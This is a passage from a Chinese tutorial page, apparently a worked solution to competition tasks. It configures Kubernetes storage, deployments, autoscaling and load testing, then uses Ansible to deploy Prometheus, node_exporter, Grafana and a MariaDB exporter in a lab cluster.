class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nfs-client-provisioner</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">nodeName:</span> <span class="string">master</span>   <span class="comment">#设置在master节点运行</span></span><br><span class="line">      <span class="attr">tolerations:</span>           <span class="comment">#设置容忍master节点污点</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">node-role.kubernetes.io/master</span></span><br><span class="line">          <span class="attr">operator:</span> <span class="string">Equal</span></span><br><span class="line">          <span class="attr">value:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">      <span class="attr">serviceAccountName:</span> <span class="string">nfs-client-provisioner</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nfs-client-provisioner</span></span><br><span class="line">          <span class="attr">image:</span> <span class="number">192.168</span><span class="number">.200</span><span class="number">.165</span><span class="string">/library/nfs-client-provisioner@sha256:4c16495be5b893efea1c810e8451c71e1c58f076494676cae2ecab3a382b6ed0</span></span><br><span class="line">          <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">          <span class="attr">volumeMounts:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nfs-client-root</span></span><br><span class="line">              <span class="attr">mountPath:</span> <span class="string">/persistentvolumes</span></span><br><span class="line">          <span class="attr">env:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">PROVISIONER_NAME</span></span><br><span class="line">              <span class="attr">value:</span> <span class="string">k8s/nfs-subdir-external-provisioner</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">NFS_SERVER</span></span><br><span class="line">              <span class="attr">value:</span> <span class="number">192.168</span><span class="number">.200</span><span class="number">.162</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">NFS_PATH</span></span><br><span class="line">              <span class="attr">value:</span> <span class="string">/nfsdata</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nfs-client-root</span></span><br><span class="line">          <span class="attr">nfs:</span></span><br><span class="line">            <span class="attr">server:</span> <span class="number">192.168</span><span class="number">.200</span><span class="number">.162</span>  <span class="comment"># NFS SERVER_IP</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/nfsdata</span></span><br></pre></td></tr></table></figure>

<p><strong>编写pvc.yaml</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolumeClaim</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nfs-claim</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">storageClassName:</span> <span class="string">managed-nfs-storage</span></span><br><span class="line">  <span class="attr">accessModes:</span> [<span class="string">&quot;ReadWriteMany&quot;</span>,<span class="string">&quot;ReadOnlyMany&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">    <span class="attr">requests:</span></span><br><span class="line">      <span class="attr">storage:</span> <span class="string">1Gi</span></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220919112742832.png" alt="image-20220919112742832"></p>
<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220919112832185.png" alt="image-20220919112832185"></p>
<h3 id="3-编写deployment-yaml文件"><a href="#3-编写deployment-yaml文件" class="headerlink" title="3.编写deployment.yaml文件"></a>3.编写deployment.yaml文件</h3><p>将提供的 nginx:latest 镜像上传至 harbor 镜像仓库，使用该镜像编写 deployment 文件，要求将已创建的 pvc 挂载至&#x2F;html 目录下，副本数 1，实现资源限制:需求内存 300Mi，需求 CPU 300M，限制内存 450Mi，限制 CPU450M，将 POD 状态截图和 yaml 文件提交至答题框。【3 分】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#若报错请删除污点</span><br><span class="line">kubectl taint nodes master node-role.kubernetes.io/master- </span><br></pre></td></tr></table></figure>

<p><strong>nginx.yaml</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">   <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">   <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">          <span class="attr">image:</span> <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">/library/nginx@sha256:416d511ffa63777489af47f250b70d1570e428b67666567085f2bece3571ad83</span></span><br><span class="line">          <span class="attr">volumeMounts:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nfs-pv</span></span><br><span class="line">              <span class="attr">mountPath:</span> <span class="string">/html</span></span><br><span class="line">          <span class="attr">resources:</span></span><br><span class="line">            <span class="attr">limits:</span></span><br><span class="line">              <span class="attr">cpu:</span> <span class="string">450m</span></span><br><span class="line">              <span class="attr">memory:</span> <span class="string">450Mi</span></span><br><span class="line">            <span class="attr">requests:</span></span><br><span class="line">              <span class="attr">cpu:</span> <span class="string">300m</span></span><br><span class="line">              <span class="attr">memory:</span> <span class="string">300Mi</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nfs-pv</span></span><br><span class="line">          <span class="attr">persistentVolumeClaim:</span></span><br><span class="line">            <span class="attr">claimName:</span> <span class="string">nfs-claim</span></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220919141959017.png" alt="image-20220919141959017"></p>
<h3 id="4-创建-service-服务，提供对外访问接口"><a href="#4-创建-service-服务，提供对外访问接口" class="headerlink" title="4.创建 service 服务，提供对外访问接口"></a>4.创建 service 服务，提供对外访问接口</h3><p>基于 nginx 的 pod 服务，编写一个 service 名称为 nginx-svc，代理 nginx的服务端口，端口类型为 nodeport，创建成功后可以通过该 service 访问 nginx。</p>
<p>完成后提交 yaml 文件及访问截图至答题框。【3 分】</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-svc</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">NodePort</span></span><br><span class="line">  <span class="attr">ports:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line">      <span class="attr">targetPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>

<h3 id="5-配置-metrics-server-实现资源监控"><a href="#5-配置-metrics-server-实现资源监控" class="headerlink" title="5.配置 metrics-server 实现资源监控"></a>5.配置 metrics-server 实现资源监控</h3><p>将已提供的 metrics-server 镜像上传至 harbor，修改 components.yaml，创建 metrics-server，完成后，将 metrics-server 状态截图提交至答题框。【2分】</p>
<p><strong>1、修改配置</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"> <span class="comment">#查看服务是否启动</span></span><br><span class="line"> <span class="string">ps</span> <span class="string">-ef</span> <span class="string">|grep</span> <span class="string">apiserver|grep</span> <span class="literal">true</span></span><br><span class="line"> <span class="comment">#若报Error from server (NotFound): the server could not find the requested resource (get pods.metrics.k8s.io)</span></span><br><span class="line"><span class="string">vi</span> <span class="string">/etc/kubernetes/manifests/kube-apiserver.yaml</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">--enable-aggregator-routing=true</span> <span class="comment">#在command中添加</span></span><br><span class="line"><span class="comment">#修改配置文件</span></span><br><span class="line"><span class="string">vi</span> <span class="string">metrics-server-0.3.6/deploy/1.8+/metrics-server-deployment.yaml</span> </span><br><span class="line">  <span class="string">args：</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/metrics-server</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">--kubelet-insecure-tls</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">--kubelet-preferred-address-types=InternalIP</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<p><strong>2.启动服务</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root/metrics-server-0.3.6/deploy/1.8+</span><br><span class="line">kubectl apply -f .</span><br></pre></td></tr></table></figure>

<h3 id="6-配置弹性伸缩"><a href="#6-配置弹性伸缩" class="headerlink" title="6.配置弹性伸缩"></a>6.配置弹性伸缩</h3><p>编写 deployment-nginx-hpa.yaml 文件，要求最小副本数 1，最大副本数 3,当整体的资源利用率超过 80%的时候实现自动扩容，将 yaml 文件提交至答题框。【2 分】</p>
<p><strong>deployment-nginx-hpa.yaml</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">autoscaling/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">HorizontalPodAutoscaler</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-hpa</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">maxReplicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">minReplicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">targetCPUUtilizationPercentage:</span> <span class="number">80</span></span><br><span class="line">  <span class="attr">scaleTargetRef:</span></span><br><span class="line">    <span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line">    <span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nginx</span>            </span><br></pre></td></tr></table></figure>

<h3 id="7-压力测试"><a href="#7-压力测试" class="headerlink" title="7.压力测试"></a>7.压力测试</h3><p>安装 httpd-tools 工具，通过 service 提供的对外访问接口进行压力测试，验证 HPA 弹性伸缩功能，将 HPA 状态和 POD 状态截图提交至答题框。【2 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yum install -y httpd-tools</span><br><span class="line"><span class="comment">#测试命令 ab -n 请求次数 -c 并发数 访问地址</span></span><br><span class="line">         ab -n 1000 -c 100 https://www.baidu.com/  表请求1000次中有100并发</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="C-场次题目：企业级应用的自动化部署和运维"><a href="#C-场次题目：企业级应用的自动化部署和运维" class="headerlink" title="C 场次题目：企业级应用的自动化部署和运维"></a><strong>C 场次题目：企业级应用的自动化部署和运维</strong></h1><p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220920102910609.png" alt="image-20220920102910609"></p>
<h2 id="任务-1-企业级应用的自动化部署（15-分）"><a href="#任务-1-企业级应用的自动化部署（15-分）" class="headerlink" title="任务 1 企业级应用的自动化部署（15 分）"></a><strong>任务 1 企业级应用的自动化部署（15 分）</strong></h2><h3 id="1-ansible-自动化运维工具的安装【3-分】"><a href="#1-ansible-自动化运维工具的安装【3-分】" class="headerlink" title="1. ansible 自动化运维工具的安装【3 分】"></a>1. ansible 自动化运维工具的安装【3 分】</h3><p>请使用提供的软件包在 master 节点安装 ansible，安装完成后使用 ansible –version 命令验证是否安装成功。为所有节点添加 test 用户，设置用户密码为 000000。为 test 用户设置免密 sudo，配置 ssh 免密登录，使 master 节点能够免密登录所有节点的 test 用户。</p>
<p>将 ansible –version 命令和回显粘贴到答题框。</p>
<p><strong>master</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装依赖</span></span><br><span class="line">yum install -y jinja2 PyYAML cryptography</span><br><span class="line"></span><br><span class="line">rpm -ivh ansible-2.4.6.0-1.el7.ans.noarch.rpm</span><br><span class="line"></span><br><span class="line">ansible --version</span><br></pre></td></tr></table></figure>

<p><strong>全部节点</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">useradd <span class="built_in">test</span></span><br><span class="line">passwd <span class="built_in">test</span></span><br><span class="line"><span class="comment">#设置免密sudo 在root    ALL=(ALL)       ALL下面添加</span></span><br><span class="line">visudo</span><br><span class="line"><span class="built_in">test</span> ALL=(ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure>

<p><strong>master</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh-keygen </span><br><span class="line">ssh-copy-id <span class="built_in">test</span>@192.168.200.100</span><br><span class="line">ssh-copy-id <span class="built_in">test</span>@192.168.200.101</span><br><span class="line">ssh-copy-id <span class="built_in">test</span>@192.168.200.102</span><br></pre></td></tr></table></figure>

<h3 id="2-ansible-自动化运维工具的初始化【3-分】"><a href="#2-ansible-自动化运维工具的初始化【3-分】" class="headerlink" title="2.ansible 自动化运维工具的初始化【3 分】"></a>2.ansible 自动化运维工具的初始化【3 分】</h3><p>创建 &#x2F;root&#x2F;ansible 目录作为工作目录，在该目录内创建 ansible.cfg 文件并完成以下配置，清单文件位置为 &#x2F;root&#x2F;ansible&#x2F;inventory，登录用户为 test，登录时不需要输入密码。设置并行主机数量为 2，允许 test 用户免密提权到 root。</p>
<p>将 ansible.cfg 文件内容粘贴到答题框。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /root/ansible</span><br><span class="line">vi ansible.cfg</span><br><span class="line"></span><br><span class="line">[defaults]</span><br><span class="line">inventory=./inventory</span><br><span class="line">forks=2</span><br><span class="line">remote_user=<span class="built_in">test</span></span><br><span class="line">ask_pass=<span class="literal">false</span></span><br><span class="line">[privilege_escalation]</span><br><span class="line">become=<span class="literal">true</span></span><br><span class="line">become_user=root</span><br><span class="line">become_ask_pass=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">###########################</span></span><br><span class="line">[defaults]</span><br><span class="line">inventory=./inventory</span><br><span class="line">forks=2</span><br><span class="line">remote_user=<span class="built_in">test</span></span><br><span class="line">ask_pass=<span class="literal">false</span></span><br><span class="line">[privilege_escalation]</span><br><span class="line">become=<span class="literal">true</span></span><br><span class="line">become_method=<span class="built_in">sudo</span></span><br><span class="line">become_user=root</span><br><span class="line">become_ask_pass=<span class="literal">false</span></span><br><span class="line">                       </span><br></pre></td></tr></table></figure>

<h3 id="3-主机清单的编写【2分】"><a href="#3-主机清单的编写【2分】" class="headerlink" title="3.主机清单的编写【2分】"></a>3.主机清单的编写【2分】</h3><p>编写主机清单文件，创建 master 用户组，master 用户组内添加 master 主机；创建 node 用户组，node 组内添加 node1 和 node2 主机，主机名不得使用 IP 地址。</p>
<p>完成后执行 ansible-inventory –list 、ansible all -m ping 和 ansible all -a “id” 命令，将这三条命令返回结果粘贴到答题框。 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi inventory</span><br><span class="line"></span><br><span class="line">[master]</span><br><span class="line">master</span><br><span class="line">[node]</span><br><span class="line">node1</span><br><span class="line">node2</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220920141415128.png" alt="image-20220920141415128"></p>
<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220920141515729.png" alt="image-20220920141515729"></p>
<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220920141544169.png" alt="image-20220920141544169"></p>
<h3 id="4-使用自动化工具对-master-节点进行初始化【2-分】"><a href="#4-使用自动化工具对-master-节点进行初始化【2-分】" class="headerlink" title="4.使用自动化工具对 master 节点进行初始化【2 分】"></a>4.使用自动化工具对 master 节点进行初始化【2 分】</h3><p>请编写 prometheus.yml 控制 master 主机组，使用对应模块将 SELinux 临时状态和开机启动状态也设置为 disabled。请使用 ansible 对应模块安装时间同步服务，使用文本编辑模块将该服务的作用域设置为 0.0.0.0&#x2F;0，并设置状态为启动和开机自动启动。首先将提供的 prometheus-2.37.0.linux-amd64.tar.gz 使用文件拷贝模块将该压缩包拷贝到目标主机的&#x2F;usr&#x2F;local&#x2F; 下，使用 shell 模块解压该压缩包。</p>
<p>完成后提交 yml 文件和和 ansible 运行结果。</p>
<p><strong>vi prometheus.yml</strong> </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">master</span></span><br><span class="line">  <span class="attr">remote_user:</span> <span class="string">root</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">SELINUX=disabled</span></span><br><span class="line">      <span class="attr">selinux:</span> <span class="string">state=disabled</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">stop</span> <span class="string">firewalld</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo systemctl stop firewalld &amp;&amp; sudo systemctl disable firewalld&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">install</span> <span class="string">chrony</span></span><br><span class="line">      <span class="attr">yum:</span> <span class="string">name=chrony</span> <span class="string">state=present</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">allow</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">/0</span></span><br><span class="line">      <span class="attr">blockinfile:</span> <span class="string">path=/etc/chrony.conf</span> <span class="string">block=&quot;allow</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">/0&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">start</span> <span class="string">chrony</span></span><br><span class="line">      <span class="attr">service:</span> <span class="string">name=chronyd</span> <span class="string">state=started</span> <span class="string">enabled=yes</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">copy</span> <span class="string">promethus</span></span><br><span class="line">      <span class="attr">copy:</span> <span class="string">src=/root/prometheus-2.37.0.linux-amd64.tar.gz</span> <span class="string">dest=/usr/local/</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tar</span> <span class="string">prometheus</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo tar -zxvf /usr/local/prometheus-2.37.0.linux-amd64.tar.gz -C /usr/local&#x27;</span></span><br><span class="line">                      </span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220920161220492.png" alt="image-20220920161220492"></p>
<h3 id="5-使用自动化运维工具完成企业级应用的部署【5-分】"><a href="#5-使用自动化运维工具完成企业级应用的部署【5-分】" class="headerlink" title="5.使用自动化运维工具完成企业级应用的部署【5 分】"></a>5.使用自动化运维工具完成企业级应用的部署【5 分】</h3><p>编写 prometheus.yml.j2 模板文件，将所有 node 节点信息添加到该文件中，但是被管节点的主机名信息必须使用变量 IP 地址可以手动输入。完成后请创建node_exporter.yml 文件，编写第一个 play，将该 play 命名为 node，该 play控制的主机组为 node。使用 ansible 模块将 node_exporter-1.3.1.linux-amd64.tar.gz 发送到 node 主机组的 &#x2F;usr&#x2F;local&#x2F; 下，使用一个 shell 模块解压该压缩包，并启动该服务。随后编写第二个 play，将第二个 play 命名为 master，第二个 play 控制 master 节点。首先使用 ansible 模块将 prometheus.yml.j2 文件传输到 master 节点，然后使用 script 模块将 prometheus 启动。使用对应模块将 grafana-8.1.2-1.x86_64.rpm 包发送到被控节点的 &#x2F;mnt&#x2F; 目录下，然后使用对应模块将该软件包安装，安装完成后设置 grafana 服务启动并设置开机自动启动。使用浏览器登录 prometheus 查看 prometheus 是否成功监控所有 node 节点。</p>
<p>请将浏览器反馈的结果截图、prometheus.yml.j2 文件的内容、node_exporter.yml 文件内容及运行结果提交到答题框。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">node</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">node</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">copy</span> <span class="string">node_expose</span></span><br><span class="line">      <span class="attr">copy:</span> <span class="string">src=/root/node_exporter-1.3.1.linux-amd64.tar.gz</span> <span class="string">dest=/usr/local/</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tar</span> <span class="string">node_expose</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo tar -zxvf /usr/local/node_exporter-1.3.1.linux-amd64.tar.gz -C /usr/local/&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">start</span> <span class="string">node_export</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo nohup /usr/local/node_exporter-1.3.1.linux-amd64/node_exporter &amp;&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">master</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">master</span></span><br><span class="line">  <span class="attr">vars:</span></span><br><span class="line">    <span class="attr">node1:</span> <span class="number">192.168</span><span class="number">.200</span><span class="number">.101</span></span><br><span class="line">    <span class="attr">node2:</span> <span class="number">192.168</span><span class="number">.200</span><span class="number">.102</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">template</span> <span class="string">j2</span></span><br><span class="line">      <span class="attr">template:</span> <span class="string">src=./prometheus.yml.j2</span> <span class="string">dest=/usr/local/prometheus-2.37.0.linux-amd64/prometheus.yml</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">start</span> <span class="string">prometheus</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo nohup /usr/local/prometheus-2.37.0.linux-amd64/prometheus &amp;&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">copy</span> <span class="string">grafana</span></span><br><span class="line">      <span class="attr">copy:</span> <span class="string">src=/root/grafana-8.1.2-1.x86_64.rpm</span> <span class="string">dest=/mnt/</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">install</span> <span class="string">repaired</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo yum install -y fontconfig urw-fonts &#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">install</span> <span class="string">grafana</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo rpm -ivh /mnt/grafana-8.1.2-1.x86_64.rpm&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">enable</span> <span class="string">gtafana</span></span><br><span class="line">      <span class="attr">service:</span> <span class="string">name=grafana-server</span> <span class="string">state=started</span> <span class="string">enabled=yes</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>prometheus.j2</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># my global config</span></span><br><span class="line"><span class="attr">global:</span></span><br><span class="line">  <span class="attr">scrape_interval:</span> <span class="string">15s</span> <span class="comment"># Set the scrape interval to every 15 seconds. Default is every 1 minute.</span></span><br><span class="line">  <span class="attr">evaluation_interval:</span> <span class="string">15s</span> <span class="comment"># Evaluate rules every 15 seconds. The default is every 1 minute.</span></span><br><span class="line">  <span class="comment"># scrape_timeout is set to the global default (10s).</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Alertmanager configuration</span></span><br><span class="line"><span class="attr">alerting:</span></span><br><span class="line">  <span class="attr">alertmanagers:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">static_configs:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">targets:</span></span><br><span class="line">          <span class="comment"># - alertmanager:9093</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Load rules once and periodically evaluate them according to the global &#x27;evaluation_interval&#x27;.</span></span><br><span class="line"><span class="attr">rule_files:</span></span><br><span class="line">  <span class="comment"># - &quot;first_rules.yml&quot;</span></span><br><span class="line">  <span class="comment"># - &quot;second_rules.yml&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A scrape configuration containing exactly one endpoint to scrape:</span></span><br><span class="line"><span class="comment"># Here it&#x27;s Prometheus itself.</span></span><br><span class="line"><span class="attr">scrape_configs:</span></span><br><span class="line">  <span class="comment"># The job name is added as a label `job=&lt;job_name&gt;` to any timeseries scraped from this config.</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">job_name:</span> <span class="string">&quot;prometheus&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># metrics_path defaults to &#x27;/metrics&#x27;</span></span><br><span class="line">    <span class="comment"># scheme defaults to &#x27;http&#x27;.</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">static_configs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">targets:</span> [<span class="string">&quot;localhost:9090&quot;</span>]</span><br><span class="line">  <span class="bullet">-</span> <span class="attr">job_name:</span> <span class="string">&quot;node_exposed&quot;</span></span><br><span class="line">    <span class="attr">static_configs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">targets:</span> [<span class="string">&quot;<span class="template-variable">&#123;&#123;node1&#125;&#125;</span>:9100&quot;</span>,<span class="string">&quot;<span class="template-variable">&#123;&#123;node2&#125;&#125;</span>:9100&quot;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="任务-2-企业级应用的运维（12-分）"><a href="#任务-2-企业级应用的运维（12-分）" class="headerlink" title="任务 2 企业级应用的运维（12 分）"></a>任务 2 企业级应用的运维（12 分）</h2><h3 id="1-使用-prometheus-监控-mysqld-服务【3-分】"><a href="#1-使用-prometheus-监控-mysqld-服务【3-分】" class="headerlink" title="1.使用 prometheus 监控 mysqld 服务【3 分】"></a>1.使用 prometheus 监控 mysqld 服务【3 分】</h3><p> 将提供的 mysqld_exporter-0.14.0.linux-amd64.tar.gz 发送到 agent 虚拟机 &#x2F;usr&#x2F;local&#x2F; 目录下解压并安装 mariadb 服务。进入 mariadb 数据库中创建 mysqld_monitor 用户并授权，然后创建 mariadb 配置文件，内容为数据库用户名密码。启动 mysqld_exporter 组件确保 9104 端口启动。回到 prometheus 节点修改 prometheus.yml 文件并添加 mysql 被监控信息。重启 prometheus，随后web 界面刷新并查看 mysqld 被控信息。 </p>
<p>将以上操作提交到答题框。</p>
<p><strong>vi mysqld_exporter.yml</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">node</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">node</span> </span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">copy</span> <span class="string">mysqld_exporter</span></span><br><span class="line">      <span class="attr">copy:</span> <span class="string">src=/root/mysqld_exporter-0.14.0.linux-amd64.tar.gz</span> <span class="string">dest=/usr/local/</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tar</span> <span class="string">it</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo tar -zxvf /usr/local/mysqld_exporter-0.14.0.linux-amd64.tar.gz -C /usr/local&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">anzhuang</span> <span class="string">mariadb</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo yum install -y mariadb*&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">start</span> <span class="string">mysqld</span></span><br><span class="line">      <span class="attr">service:</span> <span class="string">name=mariadb</span> <span class="string">state=started</span> <span class="string">enabled=yes</span></span><br></pre></td></tr></table></figure>

<p><strong>在agent节点</strong></p>
